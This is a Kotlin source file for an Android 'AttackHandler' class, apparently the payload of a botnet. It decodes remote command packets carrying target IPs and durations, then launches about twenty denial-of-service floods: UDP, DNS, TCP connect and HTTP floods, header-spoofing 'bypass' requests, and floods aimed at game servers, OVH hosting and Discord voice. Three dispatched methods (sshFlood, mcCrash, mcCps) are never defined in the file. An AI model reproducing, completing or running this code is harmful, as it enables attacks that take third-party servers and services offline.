package com.chud.loadd

import android.util.Log
import java.io.OutputStream
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.Socket
import kotlin.concurrent.thread
import kotlin.random.Random

class AttackHandler {
    @Volatile private var running = false
    private var attackThread: Thread? = null

    fun execute(packet: ByteArray) {
        if (packet.size < 7) return

        var offset = 0
        val duration = ((packet[offset].toLong() and 0xFF) shl 24) or
                       ((packet[offset + 1].toLong() and 0xFF) shl 16) or
                       ((packet[offset + 2].toLong() and 0xFF) shl 8) or
                       (packet[offset + 3].toLong() and 0xFF)
        offset += 4

        val attackType = packet[offset++].toInt() and 0xFF
        val targetCount = packet[offset++].toInt() and 0xFF

        val targets = LongArray(targetCount)
        for (i in 0 until targetCount) {
            targets[i] = ((packet[offset].toLong() and 0xFF) shl 24) or
                         ((packet[offset + 1].toLong() and 0xFF) shl 16) or
                         ((packet[offset + 2].toLong() and 0xFF) shl 8) or
                         (packet[offset + 3].toLong() and 0xFF)
            offset += 5
        }

        val flagCount = packet[offset++].toInt() and 0xFF
        val flags = mutableMapOf<Int, String>()
        for (i in 0 until flagCount) {
            val key = packet[offset++].toInt() and 0xFF
            val valLen = packet[offset++].toInt() and 0xFF
            flags[key] = String(packet, offset, valLen)
            offset += valLen
        }

        Log.d(TAG, "Attack: type=$attackType duration=${duration}s targets=$targetCount")

        running = true
        attackThread = thread {
            val endTime = System.currentTimeMillis() + duration * 1000
            try {
                when (attackType) {
                    0 -> udpFlood(targets, flags, endTime)
                    1 -> vseFlood(targets, flags, endTime)
                    2 -> dnsFlood(targets, flags, endTime)
                    3 -> synFlood(targets, flags, endTime)
                    4 -> ackFlood(targets, flags, endTime)
                    5 -> stompFlood(targets, flags, endTime)
                    6 -> greipFlood(targets, flags, endTime)
                    7 -> greethFlood(targets, flags, endTime)
                    8 -> udpPlainFlood(targets, flags, endTime)
                    9 -> tcpStdFlood(targets, flags, endTime)
                    10 -> httpFlood(targets, flags, endTime)
                    11 -> tcpFlood(targets, flags, endTime)
                    12 -> ovhFlood(targets, flags, endTime)
                    13 -> stdhexFlood(targets, flags, endTime)
                    14 -> udpRandomFlood(targets, flags, endTime)
                    15 -> httpBypassFlood(targets, flags, endTime)
                    16 -> icmpFlood(targets, flags, endTime)
                    17 -> raknetFlood(targets, flags, endTime)
                    18 -> discordFlood(targets, flags, endTime)
                    19 -> sshFlood(targets, flags, endTime)
                    20 -> mcCrash(targets, flags, endTime)
                    21 -> mcCps(targets, flags, endTime)
                    else -> Log.e(TAG, "Unsupported attack type: $attackType")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Attack error: ${e.message}")
            }
            running = false
        }
    }

    fun stop() {
        running = false
        attackThread?.interrupt()
        attackThread = null
    }

    fun isRunning(): Boolean = running

    // ─── helpers ───
    private fun gfi(flags: Map<Int, String>, k: Int, d: Int): Int = flags[k]?.toIntOrNull() ?: d
    private fun gf(flags: Map<Int, String>, k: Int, d: String): String = flags[k] ?: d
    private fun dport(f: Map<Int, String>): Int = gfi(f, 7, 0).let { if (it == 65535) 0 else it }
    private fun sport(f: Map<Int, String>): Int = gfi(f, 6, 0).let { if (it == 65535) 0 else it }
    private fun psize(f: Map<Int, String>): Int = gfi(f, 0, 512).coerceIn(1, 1460)
    private fun ttl(f: Map<Int, String>): Int = gfi(f, 4, 64)
    private fun toIp(t: Long) = "${(t shr 24) and 0xFF}.${(t shr 16) and 0xFF}.${(t shr 8) and 0xFF}.${t and 0xFF}"
    private fun randoPort() = Random.nextInt(65535) + 1
    private fun rb(n: Int) = ByteArray(n).also { Random.nextBytes(it) }

    // ═══════════════════════════════════════════
    //  0 — UDP generic
    // ═══════════════════════════════════════════
    private fun udpFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags)
        val size = psize(flags)
        val buf = rb(size)
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                try {
                    DatagramSocket().use { s ->
                        s.send(DatagramPacket(buf, buf.size, InetAddress.getByName(toIp(t)),
                            if (port > 0) port else randoPort()))
                    }
                } catch (_: Exception) {}
            }
        }
    }

    // ═══════════════════════════════════════════
    //  1 — VSE (Valve Source Engine) UDP
    // ═══════════════════════════════════════════
    private fun vseFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags).let { if (it > 0) it else 27015 }
        val buf = ByteArray(1400).also {
            it[0] = 0xFF.toByte(); it[1] = 0xFF.toByte(); it[2] = 0xFF.toByte(); it[3] = 0xFF.toByte()
            it[4] = 0x54; it[5] = 0x53; it[6] = 0x6F; it[7] = 0x75; it[8] = 0x72; it[9] = 0x63; it[10] = 0x65
            Random.nextBytes(it, 11, it.size - 11)
        }
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                try { DatagramSocket().use { s -> s.send(DatagramPacket(buf, buf.size, InetAddress.getByName(toIp(t)), port)) } } catch (_: Exception) {}
            }
        }
    }

    // ═══════════════════════════════════════════
    //  2 — DNS query flood
    // ═══════════════════════════════════════════
    private fun dnsFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags).let { if (it > 0) it else 53 }
        val domain = gf(flags, 8, "google.com")
        val query = buildDnsQuery(domain)
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                try { DatagramSocket().use { s -> s.send(DatagramPacket(query, query.size, InetAddress.getByName(toIp(t)), port)) } } catch (_: Exception) {}
            }
        }
    }

    private fun buildDnsQuery(domain: String): ByteArray {
        val b = ByteArrayBuffer()
        b.writeShort(Random.nextInt(65535))
        b.writeShort(0x0100); b.writeShort(0x0001); b.writeShort(0x0000); b.writeShort(0x0000); b.writeShort(0x0000)
        for (part in domain.split(".")) { b.writeByte(part.length); b.writeBytes(part.toByteArray()) }
        b.writeByte(0x00); b.writeShort(0x0001); b.writeShort(0x0001)
        return b.toByteArray()
    }

    // ═══════════════════════════════════════════
    //  3 — SYN flood (rapid connect)
    // ═══════════════════════════════════════════
    private fun synFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags).let { if (it > 0) it else 80 }
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                try {
                    val s = Socket()
                    s.connect(InetSocketAddress(toIp(t), port), 2000)
                    s.close()
                } catch (_: Exception) {}
            }
        }
    }

    // ═══════════════════════════════════════════
    //  4 — ACK flood (connect + send ACK-like data)
    // ═══════════════════════════════════════════
    private fun ackFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags).let { if (it > 0) it else 80 }
        val payload = rb(psize(flags))
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                try { Socket().use { s -> s.connect(InetSocketAddress(toIp(t), port), 2000); s.soTimeout = 500; s.getOutputStream().write(payload); s.getOutputStream().flush() } } catch (_: Exception) {}
            }
        }
    }

    // ═══════════════════════════════════════════
    //  5 — STOMP flood (multi-connect per target)
    // ═══════════════════════════════════════════
    private fun stompFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags).let { if (it > 0) it else 80 }
        val payload = rb(psize(flags))
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                val ip = toIp(t)
                val conns = (0..4).map { thread(start = false) {
                    try { Socket().use { s -> s.connect(InetSocketAddress(ip, port), 2000); s.soTimeout = 500; s.getOutputStream().write(payload); s.getOutputStream().flush() } } catch (_: Exception) {}
                } }
                conns.forEach { it.start() }
                conns.forEach { it.join(1000) }
            }
        }
    }

    // ═══════════════════════════════════════════
    //  6 — GREIP flood (UDP with GRE-like payload)
    // ═══════════════════════════════════════════
    private fun greipFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags).let { if (it > 0) it else randoPort() }
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                try {
                    val pkt = ByteArray(psize(flags) + 28)
                    pkt[20] = 0; pkt[21] = 0; pkt[22] = 0x08.toByte(); pkt[23] = 0x00
                    Random.nextBytes(pkt, 24, pkt.size - 24)
                    DatagramSocket().use { s -> s.send(DatagramPacket(pkt, pkt.size, InetAddress.getByName(toIp(t)), if (port > 0) port else randoPort())) }
                } catch (_: Exception) {}
            }
        }
    }

    // ═══════════════════════════════════════════
    //  7 — GREETH flood (UDP with GRE+Ethernet payload)
    // ═══════════════════════════════════════════
    private fun greethFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags).let { if (it > 0) it else randoPort() }
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                try {
                    val pkt = ByteArray(psize(flags) + 42)
                    pkt[28] = 0xFF.toByte(); pkt[29] = 0xFF.toByte(); pkt[30] = 0xFF.toByte(); pkt[31] = 0xFF.toByte(); pkt[32] = 0xFF.toByte(); pkt[33] = 0xFF.toByte()
                    pkt[34] = 0xFF.toByte(); pkt[35] = 0xFF.toByte(); pkt[36] = 0xFF.toByte(); pkt[37] = 0xFF.toByte(); pkt[38] = 0xFF.toByte(); pkt[39] = 0xFF.toByte()
                    pkt[40] = 0x08.toByte(); pkt[41] = 0x00
                    Random.nextBytes(pkt, 42, pkt.size - 42)
                    DatagramSocket().use { s -> s.send(DatagramPacket(pkt, pkt.size, InetAddress.getByName(toIp(t)), if (port > 0) port else randoPort())) }
                } catch (_: Exception) {}
            }
        }
    }

    // ═══════════════════════════════════════════
    //  8 — UDP plain (no fancy options, just raw throughput)
    // ═══════════════════════════════════════════
    private fun udpPlainFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags)
        val buf = rb(psize(flags))
        // reuse one socket for speed
        DatagramSocket().use { s ->
            while (running && System.currentTimeMillis() < endTime) {
                for (t in targets) {
                    if (!running) break
                    try { s.send(DatagramPacket(buf, buf.size, InetAddress.getByName(toIp(t)), if (port > 0) port else randoPort())) } catch (_: Exception) {}
                }
            }
        }
    }

    // ═══════════════════════════════════════════
    //  9 — STD (simple TCP data flood)
    // ═══════════════════════════════════════════
    private fun tcpStdFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags).let { if (it > 0) it else 80 }
        val body = gf(flags, 24, "GET / HTTP/1.0\r\n\r\n").toByteArray()
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                try { Socket().use { s -> s.connect(InetSocketAddress(toIp(t), port), 3000); s.soTimeout = 1000; s.getOutputStream().write(body); s.getOutputStream().flush() } } catch (_: Exception) {}
            }
        }
    }

    // ═══════════════════════════════════════════
    // 10 — HTTP flood
    // ═══════════════════════════════════════════
    private fun httpFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags).let { if (it > 0) it else 80 }
        val path = gf(flags, 24, "/")
        val method = gf(flags, 25, "GET")
        val domain = flags[8]
        var resolveCount = 0
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                try {
                    var ip = toIp(t)
                    val host = domain ?: ip
                    if (domain != null && resolveCount++ % 10 == 0) {
                        InetAddress.getByName(domain).hostAddress?.let { ip = it }
                    }
                    Socket().use { s ->
                        s.connect(InetSocketAddress(ip, port), 5000); s.soTimeout = 5000
                        val req = "$method $path HTTP/1.1\r\nHost: $host\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
                        s.getOutputStream().write(req.toByteArray()); s.getOutputStream().flush()
                    }
                } catch (_: Exception) {}
            }
        }
    }

    // ═══════════════════════════════════════════
    // 11 — TCP raw data flood
    // ═══════════════════════════════════════════
    private fun tcpFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags).let { if (it > 0) it else 80 }
        val buf = rb(psize(flags))
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                try { Socket().use { s -> s.connect(InetSocketAddress(toIp(t), port), 3000); s.soTimeout = 500; s.getOutputStream().write(buf); s.getOutputStream().flush() } } catch (_: Exception) {}
            }
        }
    }

    // ═══════════════════════════════════════════
    // 12 — OVH (UDP DPI-bypass: mode via urg flag)
    // ═══════════════════════════════════════════
    private fun ovhFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags)
        val mode = gfi(flags, 11, 2)  // urg=0 ipopt 1=gre 2=chaos
        val size = psize(flags).coerceIn(0, 1400)
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                try {
                    val pkt = when (mode) {
                        0 -> { val b = rb(size + 28 + 12); b[20] = 68; b[21] = 8; b[22] = 5; b /* IP options */ }
                        1 -> { val b = rb(size + 36); b[20] = 0; b[21] = 0; b[22] = 0x08.toByte(); b[23] = 0x00; b /* GRE encap */ }
                        else -> rb(size + 28) /* chaos: random proto */ 
                    }
                    DatagramSocket().use { s -> s.send(DatagramPacket(pkt, pkt.size, InetAddress.getByName(toIp(t)), if (port > 0) port else randoPort())) }
                } catch (_: Exception) {}
            }
        }
    }

    // ═══════════════════════════════════════════
    // 13 — STDHEX (hex-payload TCP flood)
    // ═══════════════════════════════════════════
    private fun stdhexFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags).let { if (it > 0) it else 80 }
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                try { Socket().use { s ->
                    s.connect(InetSocketAddress(toIp(t), port), 3000); s.soTimeout = 1000
                    val hex = ByteArray(psize(flags)) { i -> (if (i % 2 == 0) (i/2 % 16).toString(16) else " ")[0].code.toByte() }
                    s.getOutputStream().write(hex); s.getOutputStream().flush()
                } } catch (_: Exception) {}
            }
        }
    }

    // ═══════════════════════════════════════════
    // 14 — UDP random (varying packet sizes+ports per send)
    // ═══════════════════════════════════════════
    private fun udpRandomFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags)
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                try {
                    val sz = Random.nextInt(64, 1460)
                    val p = if (port > 0) port else Random.nextInt(65535) + 1
                    DatagramSocket().use { s -> s.send(DatagramPacket(rb(sz), sz, InetAddress.getByName(toIp(t)), p)) }
                } catch (_: Exception) {}
            }
        }
    }

    // ═══════════════════════════════════════════
    // 15 — HTTP bypass (re-resolve domain every request)
    // ═══════════════════════════════════════════
    private fun httpBypassFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags).let { if (it > 0) it else 80 }
        val path = gf(flags, 24, "/"); val method = gf(flags, 25, "GET"); val domain = flags[8]
        var dnsIdx = 0
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                try {
                    val host = domain ?: toIp(t)
                    val ip = if (domain != null) resolveDomain(domain, dnsIdx++).also { dnsIdx++ } ?: host else toIp(t)
                    Socket().use { s ->
                        s.connect(InetSocketAddress(ip, port), 5000); s.soTimeout = 5000
                        val req = "$method $path HTTP/1.1\r\nHost: $host\r\nConnection: keep-alive\r\n" +
                                "User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G975F)\r\n" +
                                "Accept: text/html,application/xhtml+xml\r\nAccept-Language: en-US,en;q=0.9\r\n" +
                                "Cache-Control: no-cache\r\nReferer: http://$host/\r\n" +
                                "Cookie: __cfduid=d${System.currentTimeMillis()}\r\n\r\n"
                        s.getOutputStream().write(req.toByteArray()); s.getOutputStream().flush()
                    }
                } catch (_: Exception) {}
            }
        }
    }

    private fun resolveDomain(domain: String, idx: Int): String? = try {
        InetAddress.getByName(domain).hostAddress
    } catch (_: Exception) { null }

    // ═══════════════════════════════════════════
    // 16 — ICMP (UDP fallback, no raw socket on unrooted Android)
    // ═══════════════════════════════════════════
    private fun icmpFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags).let { if (it > 0) it else 0 }
        val buf = ByteArray(psize(flags)).also { Random.nextBytes(it); it[0] = 8; it[1] = 0 }
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                try { DatagramSocket().use { s -> s.send(DatagramPacket(buf, buf.size, InetAddress.getByName(toIp(t)), if (port > 0) port else randoPort())) } } catch (_: Exception) {}
            }
        }
    }

    // ═══════════════════════════════════════════
    // 17 — RakNet / Minecraft Bedrock
    // ═══════════════════════════════════════════
    private fun raknetFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags).let { if (it > 0) it else 19132 }
        val magic = byteArrayOf(0x00, 0xFF.toByte(), 0xFF.toByte(), 0x00, 0xFE.toByte(), 0xFE.toByte(), 0xFE.toByte(), 0xFE.toByte(), 0xFD.toByte(), 0xFD.toByte(), 0xFD.toByte(), 0xFD.toByte(), 0x12, 0x34, 0x56, 0x78)
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                try { DatagramSocket().use { s -> s.send(DatagramPacket(buildRaknetPacket(magic, port), 0, buildRaknetPacket(magic, port).size, InetAddress.getByName(toIp(t)), port)) } } catch (_: Exception) {}
            }
        }
    }

    private fun buildRaknetPacket(magic: ByteArray, port: Int): ByteArray = when (Random.nextInt(4)) {
        0 -> ByteArray(33).also { b -> b[0] = 0x01; val ts = System.currentTimeMillis() + Random.nextInt(1000); (0..7).forEach { i -> b[1+i] = ((ts shr (i*8)) and 0xFF).toByte() }; magic.copyInto(b, 9); val g = Random.nextLong(); (0..7).forEach { i -> b[25+i] = ((g shr (i*8)) and 0xFF).toByte() } }
        1 -> ByteArray(18).also { b -> b[0] = 0x05; magic.copyInto(b, 1); b[17] = 11 }
        2 -> ByteArray(33).also { b -> b[0] = 0x07; magic.copyInto(b, 1); b[21] = ((port shr 8) and 0xFF).toByte(); b[22] = (port and 0xFF).toByte(); val mtu = 1400; b[23] = ((mtu shr 8) and 0xFF).toByte(); b[24] = (mtu and 0xFF).toByte(); val g = Random.nextLong(); (0..7).forEach { i -> b[25+i] = ((g shr (i*8)) and 0xFF).toByte() } }
        else -> ByteArray(26).also { b -> b[0] = 0x09; val sg = Random.nextLong(); val cg = Random.nextLong(); val ts = System.currentTimeMillis(); (0..7).forEach { i -> b[1+i] = ((sg shr (i*8)) and 0xFF).toByte(); b[9+i] = ((cg shr (i*8)) and 0xFF).toByte(); b[17+i] = ((ts shr (i*8)) and 0xFF).toByte() }; b[25] = 0 }
    }

    // ═══════════════════════════════════════════
    // 18 — Discord voice flood
    // ═══════════════════════════════════════════
    private fun discordFlood(targets: LongArray, flags: Map<Int, String>, endTime: Long) {
        val port = dport(flags)
        val buf = byteArrayOf(0x13, 0x37, 0xCA.toByte(), 0xFE.toByte(), 0x01, 0x00, 0x00, 0x00, 0x00, 0x64, 0x69, 0x73, 0x63, 0x6F, 0x72, 0x64)
        while (running && System.currentTimeMillis() < endTime) {
            for (t in targets) {
                if (!running) return
                try { DatagramSocket().use { s -> s.send(DatagramPacket(buf, buf.size, InetAddress.getByName(toIp(t)), if (port > 0) port else randoPort())) } } catch (_: Exception) {}
            }
        }
    }

    // ─── byte buffer for DNS ───
    private class ByteArrayBuffer {
        private var buf = ByteArray(512); private var pos = 0
        fun writeByte(v: Int) { ensure(1); buf[pos++] = v.toByte() }
        fun writeShort(v: Int) { ensure(2); buf[pos++] = (v shr 8).toByte(); buf[pos++] = v.toByte() }
        fun writeBytes(b: ByteArray) { ensure(b.size); b.copyInto(buf, pos); pos += b.size }
        private fun ensure(n: Int) { if (pos + n > buf.size) buf = buf.copyOf(buf.size * 2) }
        fun toByteArray(): ByteArray = buf.copyOf(pos)
    }

    companion object { private const val TAG = "ChudNet" }
}
